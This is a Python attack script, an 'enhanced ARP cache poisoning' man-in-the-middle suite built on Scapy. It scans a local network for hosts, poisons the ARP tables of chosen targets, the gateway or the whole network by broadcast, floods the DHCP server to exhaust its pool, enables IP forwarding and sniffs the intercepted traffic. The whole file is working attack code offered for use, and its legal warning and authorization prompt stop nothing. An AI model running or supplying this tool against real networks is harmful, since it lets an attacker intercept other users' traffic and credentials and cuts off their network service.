#!/usr/bin/env python3
"""
ENHANCED ARP CACHE POISONING TOOL
Advanced Man-in-the-Middle (MITM) attack suite with multiple spoofing techniques,
traffic interception, and real-time monitoring capabilities.
"""

import sys
import time
import threading
import json
from collections import defaultdict

class ARPPoisoner:
    def __init__(self):
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'targets_poisoned': 0,
            'start_time': None,
            'intercepted_packets': 0
        }
        self.targets = []
        self.poisoned_pairs = set()
        
    def check_dependencies(self):
        """Check and import required dependencies"""
        try:
            global ARP, Ether, srp, send, sniff, conf, IP, TCP, UDP
            from scapy.all import ARP, Ether, srp, send, sniff, conf, IP, TCP, UDP
            return True
        except ImportError:
            print("\033[91m[!] Scapy library not found.\033[0m")
            print("\033[97m[*] Install it with: pip install scapy\033[0m")
            return False

    def get_mac(self, ip):
        """Get MAC address for a given IP with enhanced error handling"""
        try:
            from scapy.all import srp, Ether
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=False, retry=2)
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            print(f"\033[91m[!] Error getting MAC for {ip}: {str(e)}\033[0m")
            return None

    def get_network_info(self):
        """Get local network information automatically"""
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            
            print("\n\033[97m[*] Available network interfaces:\033[0m")
            for i, iface in enumerate(interfaces):
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    print(f"    [{i}] {iface} - {ip}")
            
            iface_choice = input("\n\033[95m[?] Select interface (number or name): \033[0m").strip()
            
            if iface_choice.isdigit():
                iface = interfaces[int(iface_choice)]
            else:
                iface = iface_choice
            
            # Get gateway
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            gateway_ip = default_gateway[0]
            gateway_iface = default_gateway[1]
            
            # Get network range
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                local_ip = addrs[netifaces.AF_INET][0]['addr']
                netmask = addrs[netifaces.AF_INET][0]['netmask']
                
                # Calculate network range
                network = self.calculate_network(local_ip, netmask)
                return iface, local_ip, gateway_ip, network
            
        except ImportError:
            print("\033[93m[!] netifaces not available, using manual input\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error getting network info: {str(e)}\033[0m")
        
        # Fallback to manual input
        iface = input("\033[95m[?] Enter network interface: \033[0m").strip()
        local_ip = input("\033[95m[?] Enter your local IP: \033[0m").strip()
        gateway_ip = input("\033[95m[?] Enter gateway IP: \033[0m").strip()
        network = input("\033[95m[?] Enter network range (e.g., 192.168.1.0/24): \033[0m").strip()
        
        return iface, local_ip, gateway_ip, network

    def calculate_network(self, ip, netmask):
        """Calculate network range from IP and netmask"""
        try:
            import ipaddress
            interface = ipaddress.IPv4Interface(f"{ip}/{netmask}")
            return str(interface.network)
        except:
            return f"{ip}/24"  # Fallback

    def discover_hosts(self, network):
        """Discover active hosts on the network"""
        print(f"\n\033[92m[*] Discovering hosts on {network}...\033[0m")
        
        try:
            from scapy.all import arping
            ans, _ = arping(network, timeout=3, verbose=False)
            
            hosts = []
            for sent, received in ans:
                hosts.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc
                })
            
            print(f"\033[97m[*] Found {len(hosts)} active hosts:\033[0m")
            for i, host in enumerate(hosts):
                print(f"    [{i}] {host['ip']} - {host['mac']}")
            
            return hosts
            
        except Exception as e:
            print(f"\033[91m[!] Host discovery failed: {str(e)}\033[0m")
            return []

    def spoof_target(self, target_ip, gateway_ip, target_mac, gateway_mac, interface=None):
        """Send spoofed ARP packets to both target and gateway"""
        try:
            from scapy.all import ARP, send
            
            # Tell target we're the gateway
            target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            # Tell gateway we're the target
            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            
            if interface:
                send(target_packet, iface=interface, verbose=False)
                send(gateway_packet, iface=interface, verbose=False)
            else:
                send(target_packet, verbose=False)
                send(gateway_packet, verbose=False)
            
            self.stats['packets_sent'] += 2
            return True
            
        except Exception as e:
            print(f"\033[91m[!] Spoofing error: {str(e)}\033[0m")
            return False

    def restore_arp(self, target_ip, gateway_ip, target_mac, gateway_mac, interface=None):
        """Restore ARP tables to original state"""
        try:
            from scapy.all import ARP, send
            
            # Restore target ARP
            target_restore = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                               psrc=gateway_ip, hwsrc=gateway_mac)
            # Restore gateway ARP
            gateway_restore = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                psrc=target_ip, hwsrc=target_mac)
            
            if interface:
                send(target_restore, iface=interface, count=3, verbose=False)
                send(gateway_restore, iface=interface, count=3, verbose=False)
            else:
                send(target_restore, count=3, verbose=False)
                send(gateway_restore, count=3, verbose=False)
                
            print(f"\033[92m[*] ARP tables restored for {target_ip} <-> {gateway_ip}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Restoration error: {str(e)}\033[0m")

    def enable_ip_forwarding(self):
        """Enable IP forwarding for MITM"""
        import platform
        try:
            if platform.system() == "Linux":
                import os
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                print("\033[92m[*] IP forwarding enabled\033[0m")
                return True
            elif platform.system() == "Windows":
                print("\033[93m[!] Enable IP forwarding manually on Windows:\033[0m")
                print("\033[97m    netsh interface ipv4 set interface <ID> forwarding=enabled\033[0m")
                return True
            elif platform.system() == "Darwin":  # macOS
                import os
                os.system("sysctl -w net.inet.ip.forwarding=1")
                print("\033[92m[*] IP forwarding enabled\033[0m")
                return True
        except Exception as e:
            print(f"\033[91m[!] Failed to enable IP forwarding: {str(e)}\033[0m")
            return False

    def disable_ip_forwarding(self):
        """Disable IP forwarding"""
        import platform
        try:
            if platform.system() == "Linux" or platform.system() == "Darwin":
                import os
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print("\033[92m[*] IP forwarding disabled\033[0m")
        except:
            pass

    def packet_sniffer(self, interface, target_ip=None):
        """Sniff and analyze intercepted traffic"""
        def packet_handler(packet):
            if not self.running:
                return
            
            self.stats['intercepted_packets'] += 1
            
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                proto = packet[IP].proto
                
                # Only show traffic involving our targets
                if target_ip and (src_ip == target_ip or dst_ip == target_ip):
                    info = f"{src_ip} -> {dst_ip}"
                    
                    if packet.haslayer(TCP):
                        info += f" [TCP:{packet[TCP].dport}]"
                        if packet[TCP].dport == 80 or packet[TCP].dport == 443:
                            info += " \033[93m(HTTP/HTTPS)\033[0m"
                        elif packet[TCP].dport == 21:
                            info += " \033[93m(FTP)\033[0m"
                        elif packet[TCP].dport == 22:
                            info += " \033[93m(SSH)\033[0m"
                        elif packet[TCP].dport == 53:
                            info += " \033[93m(DNS)\033[0m"
                    
                    elif packet.haslayer(UDP):
                        info += f" [UDP:{packet[UDP].dport}]"
                    
                    print(f"\033[90m[*] Intercepted: {info}\033[0m")
        
        try:
            print(f"\033[92m[*] Starting packet sniffer on {interface}...\033[0m")
            sniff(iface=interface, prn=packet_handler, filter="ip", store=0)
        except Exception as e:
            print(f"\033[91m[!] Sniffer error: {str(e)}\033[0m")

    def dhcp_starvation(self, interface):
        """DHCP starvation attack to exhaust DHCP pool"""
        print(f"\033[92m[*] Starting DHCP starvation attack...\033[0m")
        
        try:
            from scapy.all import DHCP, BOOTP, Ether, IP, UDP
            import random
            
            while self.running:
                # Generate random MAC
                mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
                
                # Create DHCP discover packet
                dhcp_discover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                               IP(src="0.0.0.0", dst="255.255.255.255") /
                               UDP(sport=68, dport=67) /
                               BOOTP(chaddr=mac) /
                               DHCP(options=[("message-type", "discover"), "end"]))
                
                send(dhcp_discover, iface=interface, verbose=False)
                self.stats['packets_sent'] += 1
                time.sleep(0.1)
                
        except Exception as e:
            print(f"\033[91m[!] DHCP starvation error: {str(e)}\033[0m")

    def broadcast_poisoning(self, gateway_ip, interface):
        """Poison entire network by claiming to be gateway"""
        print(f"\033[92m[*] Starting broadcast poisoning...\033[0m")
        
        try:
            from scapy.all import ARP, send
            
            while self.running:
                # Send ARP broadcast claiming to be gateway for all IPs
                poison_packet = ARP(op=2, psrc=gateway_ip, pdst="255.255.255.255")
                send(poison_packet, iface=interface, verbose=False)
                self.stats['packets_sent'] += 1
                time.sleep(5)  # Less frequent for broadcast
                
        except Exception as e:
            print(f"\033[91m[!] Broadcast poisoning error: {str(e)}\033[0m")

    def print_stats(self):
        """Print real-time statistics"""
        while self.running:
            elapsed = time.time() - self.stats['start_time']
            packets_per_sec = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r\033[97m[*] Time: {elapsed:.1f}s | "
                  f"Packets: {self.stats['packets_sent']} | "
                  f"Rate: {packets_per_sec:.1f} pps | "
                  f"Targets: {len(self.targets)} | "
                  f"Intercepted: {self.stats['intercepted_packets']}\033[0m", 
                  end='', flush=True)
            time.sleep(1)

    def run_attack(self):
        """Main attack orchestration"""
        if not self.check_dependencies():
            return

        print("\033[92m" + "="*80)
        print("           ENHANCED ARP CACHE POISONING - Advanced MITM Suite")
        print("="*80 + "\033[0m\n")
        
        print("\033[91m[!] CRITICAL WARNING: Use only on networks you own or have written permission!\033[0m")
        print("\033[91m[!] Unauthorized use is illegal and punishable by law.\033[0m")
        print("\033[91m[!] Requires root/administrator privileges for full functionality.\033[0m\n")

        # Network discovery
        iface, local_ip, gateway_ip, network = self.get_network_info()
        
        # Discover hosts
        hosts = self.discover_hosts(network)
        
        # Target selection
        print("\n\033[97m[*] Target Selection:\033[0m")
        print("  [1] Single target")
        print("  [2] Multiple targets")
        print("  [3] Entire network (broadcast)")
        print("  [4] DHCP starvation attack")
        
        mode = input("\n\033[95m[?] Select attack mode: \033[0m").strip()
        
        targets = []
        if mode == '1':
            target_ip = input("\033[95m[?] Enter target IP: \033[0m").strip()
            targets.append({'ip': target_ip})
        elif mode == '2':
            if hosts:
                target_indices = input("\033[95m[?] Enter target numbers (comma-separated): \033[0m").strip()
                indices = [int(x.strip()) for x in target_indices.split(',') if x.strip().isdigit()]
                targets = [hosts[i] for i in indices if i < len(hosts)]
            else:
                target_ips = input("\033[95m[?] Enter target IPs (comma-separated): \033[0m").strip()
                targets = [{'ip': ip.strip()} for ip in target_ips.split(',')]
        elif mode == '3':
            targets = [{'ip': 'broadcast'}]
        elif mode == '4':
            targets = [{'ip': 'dhcp'}]
        else:
            print("\033[91m[!] Invalid mode selected.\033[0m")
            return

        # Get MAC addresses for targets
        print("\n\033[92m[*] Resolving MAC addresses...\033[0m")
        gateway_mac = self.get_mac(gateway_ip)
        if not gateway_mac:
            print(f"\033[91m[!] Could not resolve gateway MAC for {gateway_ip}\033[0m")
            return
        
        for target in targets:
            if target['ip'] not in ['broadcast', 'dhcp']:
                target_mac = self.get_mac(target['ip'])
                if target_mac:
                    target['mac'] = target_mac
                    print(f"\033[97m[*] {target['ip']} -> {target_mac}\033[0m")
                else:
                    print(f"\033[91m[!] Could not resolve MAC for {target['ip']}\033[0m")
                    return

        # Enable packet sniffing
        enable_sniff = input("\n\033[95m[?] Enable packet sniffing? (yes/no): \033[0m").strip().lower() == 'yes'
        
        # Final confirmation
        print(f"\n\033[93m[*] Attack Configuration:")
        print(f"    Interface: {iface}")
        print(f"    Gateway: {gateway_ip} ({gateway_mac})")
        print(f"    Targets: {len(targets)}")
        print(f"    Mode: {mode}")
        print(f"    Sniffing: {'Enabled' if enable_sniff else 'Disabled'}\033[0m")
        
        confirm = input("\n\033[93m[?] Confirm you are authorized to perform this attack? (yes/no): \033[0m").strip().lower()
        if confirm != 'yes':
            print("\033[91m[!] Attack cancelled.\033[0m")
            return

        # Start attack
        self.running = True
        self.stats['start_time'] = time.time()
        self.targets = targets
        
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        print(f"\n\033[92m[*] Starting advanced ARP poisoning attack... (Press Ctrl+C to stop)\033[0m\n")
        
        try:
            # Start statistics thread
            stats_thread = threading.Thread(target=self.print_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            # Start packet sniffer if enabled
            if enable_sniff:
                sniff_thread = threading.Thread(target=self.packet_sniffer, args=(iface,))
                sniff_thread.daemon = True
                sniff_thread.start()
            
            # Main attack loop
            while self.running:
                for target in targets:
                    if target['ip'] == 'broadcast':
                        self.broadcast_poisoning(gateway_ip, iface)
                    elif target['ip'] == 'dhcp':
                        self.dhcp_starvation(iface)
                    else:
                        self.spoof_target(target['ip'], gateway_ip, target['mac'], gateway_mac, iface)
                
                time.sleep(2)  # Main spoofing interval
            
        except KeyboardInterrupt:
            print("\n\n\033[92m[*] Stopping attack and restoring ARP tables...\033[0m")
        
        finally:
            self.running = False
            time.sleep(2)  # Allow threads to finish
            
            # Restore ARP tables
            for target in targets:
                if target['ip'] not in ['broadcast', 'dhcp'] and 'mac' in target:
                    self.restore_arp(target['ip'], gateway_ip, target['mac'], gateway_mac, iface)
            
            # Disable IP forwarding
            self.disable_ip_forwarding()
            
            # Final statistics
            elapsed = time.time() - self.stats['start_time']
            packets_per_sec = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\n\033[92m[*] Attack Complete:")
            print(f"    Total Duration: {elapsed:.2f} seconds")
            print(f"    Total Packets Sent: {self.stats['packets_sent']}")
            print(f"    Average Rate: {packets_per_sec:.2f} packets/second")
            print(f"    Targets Poisoned: {len(targets)}")
            print(f"    Packets Intercepted: {self.stats['intercepted_packets']}\033[0m")

def run():
    poisoner = ARPPoisoner()
    poisoner.run_attack()

if __name__ == "__main__":
    run()